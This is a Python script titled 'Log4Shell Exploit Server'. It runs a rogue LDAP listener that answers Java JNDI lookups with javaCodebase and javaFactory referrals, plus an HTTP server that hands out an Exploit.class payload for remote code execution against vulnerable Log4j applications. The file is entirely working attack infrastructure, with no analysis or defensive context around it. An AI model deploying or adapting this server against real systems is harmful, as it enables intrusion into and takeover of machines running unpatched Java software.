import socket
import threading
import http.server
import socketserver
import os

class SimpleLog4ShellServer:
    def __init__(self):
        self.ldap_port = 1389
        self.http_port = 8888

    def handle_ldap(self, conn, addr):
        """Handle LDAP connections"""
        try:
            print(f"[LDAP] Connection from {addr}")

            # Read the LDAP bind request
            data = conn.recv(8192)
            print(f"[LDAP] Received {len(data)} bytes")

            # Send a simple LDAP response that redirects to our HTTP server
            # This is a minimal LDAP response that Java will understand

            # First, send a bind response (success)
            bind_response = bytes([
                0x30, 0x0c,  # SEQUENCE (12 bytes)
                0x02, 0x01, 0x01,  # messageID: 1
                0x61, 0x07,  # BindResponse
                0x0a, 0x01, 0x00,  # resultCode: success (0)
                0x04, 0x00,  # matchedDN: empty
                0x04, 0x00   # diagnosticMessage: empty
            ])
            conn.send(bind_response)
            print("[LDAP] Sent bind response")

            # Read the search request
            data = conn.recv(8192)
            print(f"[LDAP] Received search request: {len(data)} bytes")

            # Send search result with javaCodebase
            # This tells Java to load the class from our HTTP server
            search_result = bytes([
                0x30, 0x81, 0x9f,  # SEQUENCE
                0x02, 0x01, 0x02,  # messageID: 2
                0x64, 0x81, 0x99,  # SearchResultEntry
                0x04, 0x07,  # objectName: "Exploit"
                0x45, 0x78, 0x70, 0x6c, 0x6f, 0x69, 0x74,
                0x30, 0x81, 0x8d,  # attributes
                0x30, 0x3c,  # javaCodebase attribute
                0x04, 0x0c,  # type: "javaCodebase"
                0x6a, 0x61, 0x76, 0x61, 0x43, 0x6f,
                0x64, 0x65, 0x62, 0x61, 0x73, 0x65,
                0x31, 0x2a,  # value set
                0x04, 0x28,  # value: "http://localhost:8888/"
                0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f,
                0x2f, 0x6c, 0x6f, 0x63, 0x61, 0x6c,
                0x68, 0x6f, 0x73, 0x74, 0x3a, 0x38,
                0x38, 0x38, 0x38, 0x2f
            ])

            # Add javaClassName attribute
            java_class = bytes([
                0x30, 0x1e,  # SEQUENCE
                0x04, 0x0d,  # type: "javaClassName"
                0x6a, 0x61, 0x76, 0x61, 0x43, 0x6c,
                0x61, 0x73, 0x73, 0x4e, 0x61, 0x6d, 0x65,
                0x31, 0x0d,  # value set
                0x04, 0x0b,  # value: "Exploit"
                0x45, 0x78, 0x70, 0x6c, 0x6f, 0x69, 0x74
            ])

            # Add javaFactory attribute
            java_factory = bytes([
                0x30, 0x1d,  # SEQUENCE
                0x04, 0x0b,  # type: "javaFactory"
                0x6a, 0x61, 0x76, 0x61, 0x46, 0x61,
                0x63, 0x74, 0x6f, 0x72, 0x79,
                0x31, 0x0e,  # value set
                0x04, 0x0c,  # value: "Exploit"
                0x45, 0x78, 0x70, 0x6c, 0x6f, 0x69, 0x74
            ])

            # Combine all parts
            full_response = search_result + java_class + java_factory

            conn.send(full_response)
            print("[LDAP] Sent search result with javaCodebase")

            # Send search done
            search_done = bytes([
                0x30, 0x0c,  # SEQUENCE
                0x02, 0x01, 0x02,  # messageID: 2
                0x65, 0x07,  # SearchResultDone
                0x0a, 0x01, 0x00,  # resultCode: success (0)
                0x04, 0x00,  # matchedDN: empty
                0x04, 0x00   # diagnosticMessage: empty
            ])
            conn.send(search_done)
            print("[LDAP] Sent search done")

        except Exception as e:
            print(f"[LDAP] Error: {e}")
        finally:
            conn.close()

    def start_ldap(self):
        """Start LDAP server"""
        ldap_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ldap_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        ldap_sock.bind(('0.0.0.0', self.ldap_port))
        ldap_sock.listen(5)
        print(f"[+] LDAP server listening on 0.0.0.0:{self.ldap_port}")

        while True:
            conn, addr = ldap_sock.accept()
            thread = threading.Thread(target=self.handle_ldap, args=(conn, addr))
            thread.daemon = True
            thread.start()

    def start_http(self):
        """Start HTTP server"""
        class ExploitHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                print(f"[HTTP] Request from {self.client_address[0]}: {self.path}")

                if 'Exploit.class' in self.path or self.path == '/' or self.path == '/Exploit':
                    try:
                        with open('Exploit.class', 'rb') as f:
                            content = f.read()

                        self.send_response(200)
                        self.send_header('Content-Type', 'application/octet-stream')
                        self.send_header('Content-Length', str(len(content)))
                        self.end_headers()
                        self.wfile.write(content)
                        print(f"[+] Served Exploit.class ({len(content)} bytes)")
                    except Exception as e:
                        print(f"[!] Error serving file: {e}")
                        self.send_error(404)
                else:
                    self.send_error(404)

            def log_message(self, format, *args):
                pass  # Suppress default logging

        os.chdir(os.path.dirname(os.path.abspath(__file__)))
        httpd = socketserver.TCPServer(('', self.http_port), ExploitHandler)
        httpd.allow_reuse_address = True
        print(f"[+] HTTP server listening on 0.0.0.0:{self.http_port}")
        httpd.serve_forever()

    def run(self):
        """Start both servers"""
        print("=" * 60)
        print("Log4Shell Exploit Server (Simplified)")
        print("=" * 60)

        # Start LDAP in background thread
        ldap_thread = threading.Thread(target=self.start_ldap)
        ldap_thread.daemon = True
        ldap_thread.start()

        # Start HTTP in main thread
        try:
            self.start_http()
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")

if __name__ == "__main__":
    server = SimpleLog4ShellServer()
    server.run()